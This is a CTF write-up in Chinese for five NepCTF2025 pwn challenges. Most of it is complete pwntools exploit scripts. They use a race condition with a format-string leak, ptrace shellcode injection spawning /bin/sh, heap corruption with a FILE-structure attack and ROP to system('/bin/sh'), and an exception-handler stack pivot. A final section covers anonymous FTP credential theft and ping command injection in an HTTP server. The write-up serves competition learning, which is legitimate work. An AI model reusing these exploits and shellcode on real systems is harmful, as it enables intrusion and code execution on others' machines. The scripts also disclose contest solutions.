---
title: NepCTF2025 Pwn WriteUp
date: 2025-07-29 19:10:06
tags: [CTF, NepCTF2025, WP]
categories: 
    - CTF
    - NepCTF2025
---


## Time

sub_2B0F向全局变量写入文件名，文件名不包含flag的话就起一个线程读取并写入局部变量，写入后有一个bss上的格式字符串漏洞，可以泄露读取的文件的内容。由于文件名是存在全局变量的，所以存在条件竞争——先写入不包含flag的字符串，然后再写入flag，使新线程在执行到open之前改变全局变量的值。

半自动脚本（0.0）：

```python
#!/usr/bin/env python3
# Date: 2025-07-25 22:49:52

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './time'
context.log_level = 'debug'
context.timeout = 5

host = "nepctf32-rqzn-lit0-c4tn-oktachk4x586.nepctf.com"
port = 443
# io = process('./time')
io = remote(host, port, ssl=True, sni=host)
# io = remote('127.0.0.1', 13337)
elf = ELF('./time')
# libc = ELF('')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv


def cmd(i, prompt):
    sla(prompt, i)

def add():
    cmd('1')
    #......

def edit():
    cmd('2')
    #......

def show():
    cmd('3')
    #......

def dele():
    cmd('4')
    #......

rl()
name=b'%27$p'
sl(name)
ru(b'input file name you want to read:')
sl(b'a'*0x10000)
# sleep(0.5)
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')
sl(b'flag')

ia()

```

## smallbox

父进程读取Shellcode开启沙箱后执行，沙箱只允许ptrace，子进程进入死循环（未开启沙箱）。子进程pid存在局部变量内，可以通过rbp获取，因此可以通过ptrace向子进程注入Shellcode。

```python
#!/usr/bin/env python3
# Date: 2025-07-26 09:50:34

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = 5

host = "nepctf30-er63-tftc-y0yh-jgmmsdz6j107.nepctf.com"
port = 443
# io = process('./time')
io = remote(host, port, ssl=True, sni=host)
# io = remote('127.0.0.1', 13337)
elf = ELF('./pwn')
# libc = ELF('')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv
sc = """

    /* Get child PID from stack (RBP-0Ch) */
    mov eax, DWORD PTR [rbp-0x0C]  /* pid variable is at RBP-0xC */
    mov r12, rax                   /* Save child PID in r12 */

    /* ptrace(PTRACE_ATTACH, child_pid, 0, 0) */
    mov rax, 101      /* ptrace */
    mov rdi, 16       /* PTRACE_ATTACH */
    mov rsi, r12      /* child PID */
    xor rdx, rdx
    xor r10, r10
    syscall

    /* Short delay to ensure child stops */
    mov rcx, 100000
delay_loop:
    nop
    loop delay_loop

    /* Get child's registers */
    mov rax, 101      /* ptrace */
    mov rdi, 12       /* PTRACE_GETREGS */
    mov rsi, r12
    xor rdx, rdx
    lea r10, [rip + regs]
    syscall

    /* Read RIP from regs */
    mov r13, [rip + regs + 16*8]  /* RIP is at offset 16*8 in user_regs_struct */
    jmp STUN
    /* Prepare shellcode to inject */
    /* execve("/bin/sh", 0, 0) */
    /* Store shellcode in memory first */
    xor rax, rax
    push rax
    mov rax, 0x68732f2f6e69622f  /* "/bin//sh" */
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
STUN:    
    /* Now copy this shellcode to child_shellcode area */
    mov r14, [rip - 0x28]
    mov [rip + child_shellcode], r14
    mov r14, [rip - 0x2e]
    mov [rip + child_shellcode + 8], r14
    mov r14, [rip - 0x34]
    mov [rip + child_shellcode + 16], r14
    mov r14, [rip - 0x3a]
    mov [rip + child_shellcode + 24], r14
    mov r14, [rip - 0x40]
    mov [rip + child_shellcode + 32], r14

    /* Write shellcode to child's infinite loop (8 bytes at a time) */
    /* First 8 bytes */
    mov rax, 101      /* ptrace */
    mov rdi, 4        /* PTRACE_POKETEXT */
    mov rsi, r12
    mov rdx, r13      /* Address of infinite loop */
    mov r10, [rip + child_shellcode]
    syscall

    /* Second 8 bytes */
    mov rax, 101
    mov rdi, 4
    mov rsi, r12
    add rdx, 8
    mov r10, [rip + child_shellcode + 8]
    syscall

    /* Third 8 bytes */
    mov rax, 101
    mov rdi, 4
    mov rsi, r12
    add rdx, 8
    mov r10, [rip + child_shellcode + 16]
    syscall

    /* 4th 8 bytes */
    mov rax, 101
    mov rdi, 4
    mov rsi, r12
    add rdx, 8
    mov r10, [rip + child_shellcode + 24]
    syscall

    /* 5th 8 bytes */
    mov rax, 101
    mov rdi, 4
    mov rsi, r12
    add rdx, 8
    mov r10, [rip + child_shellcode + 32]
    syscall

    /* Continue child execution */
    mov rax, 101      /* ptrace */
    mov rdi, 17       /* PTRACE_DETTACH */
    mov rsi, r12
    xor rdx, rdx
    xor r10, r10
    syscall

    /* Infinite loop in parent to keep it alive */
parent_loop:
    jmp parent_loop

regs:
    .fill 27, 8, 0  /* user_regs_struct is 27*8 bytes */

child_shellcode:
    /* This will be overwritten with actual shellcode */
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    .quad 0
"""



ru(b'please input your shellcode: ')
s(asm(sc))
ia()
```

## ASTRAY

USER_read(0)泄漏elf和heap
USER_visit(0)使全局变量指向 0
然后通过MANAGER_visit修改 0 的 metadata构造任意地址读写
最后environ泄漏栈地址 ROP

```python
#!/usr/bin/env python3
# Date: 2025-07-25 22:20:10

from pwncli import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './astray'
context.log_level = 'debug'
context.timeout = 5
host = "nepctf30-ktys-rnbh-j9ob-2nidnhqbp640.nepctf.com"
port = 443
# io = process('./astray')
io = remote(host, port, ssl=True, sni=host)
elf = ELF('./astray')
libc = ELF('./libc.so.6')
one_gadgets = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv


def cmd(i, prompt="Which permission do you want to log in with?(1:manager 1000:user)\n"):
    sla(prompt, i)

def USER_write(idx, co):
    cmd('1000')
    ru("user write to logs(USER_write)\n")
    s('USER_write')
    ru("10-19: user can visit\n")
    sl(str(idx))
    sleep(0.3)
    s(co)


def USER_read(idx):
    cmd('1000')
    ru("user write to logs(USER_write)\n")
    s('USER_read')
    ru("10-19: user can visit\n")
    sl(str(idx))

def USER_visit(idx):
    cmd('1000')
    ru("user write to logs(USER_write)\n")
    s('MANAGER_visit')
    ru("10-19: user can visit\n")
    sl(str(idx))

def MANAGER_read(idx):
    cmd('1')
    ru("visit user(MANAGER_visit)\n")
    s('MANAGER_read')
    ru("1-19: manager can visit\n")
    sl(str(idx))

def MANAGER_write(idx, co):
    cmd('1')
    ru("visit user(MANAGER_visit)\n")
    s('MANAGER_write')
    ru("1-19: manager can visit\n")
    sl(str(idx))
    sleep(0.3)
    s(co)

def MANAGER_visit(idx, op, co=''):
    cmd('1')
    ru("visit user(MANAGER_visit)\n")
    s('MANAGER_visit')
    sl(str(idx))
    ru("2: manager visit user to write to user_logs\n")
    sl(str(op))
    if op == 2:
        sleep(0.3)
        s(co)

# USER_write(10, "aaaa")
# USER_write(11, "bbbb")
# USER_write(12, "cccc")
# MANAGER_write(1, '1111')
# MANAGER_write(2, '2222')
# MANAGER_write(19, 'wwww')
# MANAGER_visit(1, 2, 'qqqq')

# stop()
USER_read(0)
r(8)
heap=u64(r(8))
bss=u64(r(8))

MANAGER_write(1, p64(bss-0x120))

USER_visit(0)
MANAGER_visit(1, 2, p64(1)+p64(heap)+p64(bss-0x138))

MANAGER_visit(1, 2, p64(bss-0x180))

MANAGER_read(2)
base = u64(r(8))
base -= 0x21b780
libc.address = base
system_addr = libc.sym['system']
_IO_obstack_jumps_addr = base + 0x2173c0
_IO_list_all = libc.sym['_IO_list_all']
fp_heap = heap - 0x1d30
environ = libc.sym['environ']
rdi = base + 0x000000000002a3e5
bin_sh = libc.search("/bin/sh").__next__()

MANAGER_visit(1, 2, p64(_IO_list_all))

MANAGER_write(2, p64(fp_heap))

IO_File=IO_FILE_plus_struct()

payload = IO_File.house_of_Lys_getshell_when_exit_under_2_37(system_addr, _IO_obstack_jumps_addr, fp_heap)
MANAGER_write(3, payload)


MANAGER_visit(1, 2, p64(environ))
MANAGER_read(2)
stack = u64(r(8))

stop()
MANAGER_visit(1, 2, p64(stack-0x150))

rop_chain = p64(rdi + 1) + p64(rdi) + p64(bin_sh) + p64(system_addr)
MANAGER_write(2, rop_chain)


print("payload len ", hex(len(payload)))
print(hex(_IO_list_all))
print(hex(stack))
print(hex(bss))

ia()
```

## canutrytry

初始化将flag读到了bss内，沙箱只允许read、write和futex。visit的2可以读取size，1根据2读取的sizemalloc，如果size为负数会触发一个异常，然后被main函数的其中一个catch（401F7B）接住，这个catch会泄露libc和stack。visit的3可以向malloc的chunk内读取数据，leave可以将chunk内的数据复制到局部变量内，存在溢出，如果检测到溢出也会抛出一个异常。

main还有一个异常处理的catch（401F19），这个catch会调用两个函数，第一个可以向全局变量输入数据，第二个存在溢出，且也会抛出异常。

思路：

- 首先通过catch（401F7B）泄露libc和stack
- 然后通过leave的溢出修改ret addr，使其被catch（401F19）接住
- 在catch（401F19）调用的第一个函数内写入ROP后在第二个函数内溢出修改RBP让栈迁移到ROP上

~~~python
#!/usr/bin/env python3
# Date: 2025-07-26 22:55:10

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './canutrytry'
context.log_level = 'debug'
context.timeout = 5

# io = process('./canutrytry')
# io = remote('127.0.0.1', 13337)

# 目标HTTPS服务器信息
host = "nepctf31-jv7r-qe5v-edil-vkbkykmdh569.nepctf.com"
port = 443

# 使用pwntools原生SSL支持
io = remote(host, port, ssl=True, sni=host)
elf = ELF('./canutrytry')
libc = ELF('./libc.so.6')
one_gadgets = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv

def cmd(i, prompt="your choice >>"):
    sla(prompt, i)

def add():
    cmd('1')
    cmd('1')
    #......

def add_size(size):
    cmd('1')
    cmd('2')
    ru(":")
    sl(str(size))
    #......

def edit(idx, co):
    cmd('1')
    cmd('3')
    ru(":")
    sl(str(idx))
    ru(":")
    s(co)
    #......

def leave(idx):
    cmd('2')
    ru(": ")
    sl(str(idx))
    #......



add_size(0x30)
add()

add_size(-1)
add()
ru("setbufaddr:")
setbufaddr=int(rl().strip(),16)
ru("stackaddr:")
stackaddr=int(rl().strip(),16)
base = setbufaddr - libc.sym['setbuf']
rdi = base + 0x000000000002a3e5
rsi = base + 0x000000000002be51
rdx = base + 0x0000000000090529
write_addr = base + libc.sym['write']

edit(0, b'a'*0x20+p64(0x4058A0)+p64(0x401ED4+1))
leave(0)

ru("well,prepare your rop now!\n")
rop_chain=p64(rdi) + p64(2) + p64(rsi) + p64(0x4053C0) + p64(rdx) + p64(100) + p64(100) + p64(write_addr) + p64(1)
sl(rop_chain)

ru("Enter your flag: ")
sl('aaaa')

sleep(1)

s(b'a'*0x10 + p64(0x405458))

print(hex(rdi))
print(hex(base))
print(hex(setbufaddr))
print(hex(stackaddr))
ia()
~~~



## HRPOS

两个elf，一个shell一个camera_system。
shell自己实现了一个虚拟终端，默认是guest权限，只能执行简单命令，admin有一个flag命令，会读取flag.txt并且输出（假的），重点是ftp命令，这个命令可以泄露web_credentials.txt的内容（里面有camera_system的用户名和密码）。鉴权是通过sub_4E50()返回的结构体判断的，结构体大致如下：

```
00000000 struct __attribute__((packed)) __attribute__((aligned(4))) user // sizeof=0x14
00000000 {
00000000     __int16 field_0;
00000002     __int16 field_2;
00000004     __int16 uid;
00000006     __int16 field_6;
00000008     __int16 perms;
0000000A     __int16 field_A;
0000000C     char *name;
00000014 };
```

sub_4E50通过全局变量找到用户结构体:

```c
user *sub_4E50(void)
{
  user *v0; // rcx
  __int64 v1; // rax

  v0 = 0LL;
  v1 = *(qword_F0A0 + 1060);
  if ( v1 < *(qword_F0A0 + 1056) )
    return (qword_F0A0 + (v1 << 6) + 32);
  return v0;
}
```

guest的perms是3，admin是0x10

找了下qword_F0A0的引用在处理路径的函数——sub_4FB0中发现了可疑的片段

```c
          if ( v13 > 0x40 )
          {
            v17 = qword_F0A0;
            v30 = 0LL;
            v18 = *(qword_F0A0 + 16);
            v29 = 0LL;
            sub_4800(v18, &v29, 0, v15, 0LL);
            if ( DWORD1(v29) > 7 )
            {
              v14 = v29;
              if ( v29 > 2 && HIDWORD(v29) > 1 )
              {
                if ( DWORD2(v29) )
                {
                  v14 = (5 * HIDWORD(v29));
                  if ( (v14 + 7 * DWORD2(v29) + 3 * DWORD1(v29) + 2 * v29 - 85) <= 0x23 )
                  {
                    v26 = v16;
                    v19 = strlen(v12);
                    v20 = v26;
                    v21 = v12;
                    v22 = v19;
                    while ( 1 )
                    {
                      v27 = v20;
                      v23 = strstr(v21, "../");
                      v16 = v27;
                      if ( !v23 )
                        break;
                      v20 = v27 + 1;
                      v21 = v23 + 3;
                    }
                    if ( v22 > 0x64 && v27 > 5 )
                    {
                      v24 = *(v17 + 1060);
                      if ( v24 < *(v17 + 1056) )
                      {
                        v15 = v17 + (v24 << 6);
                        if ( *(v15 + 36) == 1 )
                          *(v15 + 40) = 16;
                      }
                    }
                  }
                }
              }
            }
          }
          v4 = (path_handler)(v12, 1LL, v14, v15, v16);
          if ( !v4 )
            break;
        }
```

*(v15 + 40) = 16;大概率是（实际也是）修改权限的，现在就动调结合静态分析看怎么才可以触发这段代码就行。重点是以下几个if：


- if ( *(v8 + 8) == 3 && a2 )，1是文件、2是文件夹、3是符号链接
- if ( v13 > 0x40 )，v13是符号链接指向文件的文件名长度
- if ( (v14 + 7 * DWORD2(v29) + 3 * DWORD1(v29) + 2 * v29 - 85) <= 0x23 )，这个具体是什么不太清楚，但只要创建足够多的符号链接就可以通过
- if ( v22 > 0x64 && v27 > 5 ) v22也是符号链接指向文件的文件名长度，v27是文件名内../的数量

进入ftp后还需要登录，简单逆向后通过以下方式绕过

```
ftp> USER anonymous
331 Password required
ftp> PASS anonymous
230 User logged in
```

获取web_credentials.txt

~~~
ftp> ls
150 Opening data connection
drwxr-xr-x 2 ftp ftp 4096 Jan 1 2024 uploads
drwxr-xr-x 2 ftp ftp 4096 Jan 1 2024 public
drwxr-xr-x 2 ftp ftp 4096 Jan 1 2024 config
-rw-r--r-- 1 ftp ftp  115 Jan 1 2024 readme.txt
-rw-r--r-- 1 ftp ftp  119 Jan 1 2024 welcome.txt
-rw-r--r-- 1 ftp ftp  122 Jan 1 2024 web_credentials.txt
-rw-r--r-- 1 ftp ftp  120 Jan 1 2024 config.txt
-rw-r--r-- 1 ftp ftp  111 Jan 1 2024 logs.txt
226 Transfer complete
ftp> RETR web_credentials.txt
150 Opening data connection
# Web服务器管理员凭据
# 请勿泄露此文件

Web Admin Panel Login:
URL: http://192.168.1.10/admin
Username: xx
Password: xx

Camera System Access:
URL: http://localhost:9998/
Username: xx
Password: xx

# 备注：摄像头系统有网络诊断功能
# 管理员可以使用ping测试网络连通性
226 Transfer complete
~~~

camera_system是HRP手写的http server，其中对/ping接口的请求处理存在命令注入：

```c
unsigned __int64 __fastcall sub_1680(int fd, const char *ping_ip)
{
  size_t v2; // rax
  FILE _0[2]; // [rsp+0h] [rbp+0h] BYREF
  char s[16]; // [rsp+200h] [rbp+200h] BYREF
  unsigned __int64 vars1208; // [rsp+1208h] [rbp+1208h]

  vars1208 = __readfsqword(0x28u);
  __printf_chk(2LL, "[CAMERA] Ping request from authenticated user: %s\n", ping_ip);
  __snprintf_chk(_0, 512LL, 2LL, 512LL, "ping -c 3 %s 2>&1", ping_ip);
  send(
    fd,
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: text/html\r\n"
    "Connection: close\r\n"
    "\r\n"
    "<!DOCTYPE html>\n"
    "<html><head><title>Ping Results</title></head><body>\n"
    "<h2> Network Ping Test Results</h2>\n"
    "<pre style='background: #f0f0f0; padding: 15px; border-radius: 5px;'>\n",
    0xEEuLL,
    0);
  if ( popen((const char *)_0, "r") )
  {
    while ( fgets(s, 4096, _0) )
    {
      v2 = strlen(s);
      send(fd, s, v2, 0);
    }
    pclose(_0);
  }
  else
  {
    sub_1650(fd, "Error: Failed to execute ping command\n");
  }
  send(fd, aPrePAHref, 0x47uLL, 0);
  return vars1208 - __readfsqword(0x28u);
}
```

__snprintf_chk(_0, 512LL, 2LL, 512LL, "ping -c 3 %s 2>&1", ping_ip);可以拼接命令。

直接在浏览器拼接会被url编码，burp里面改就行

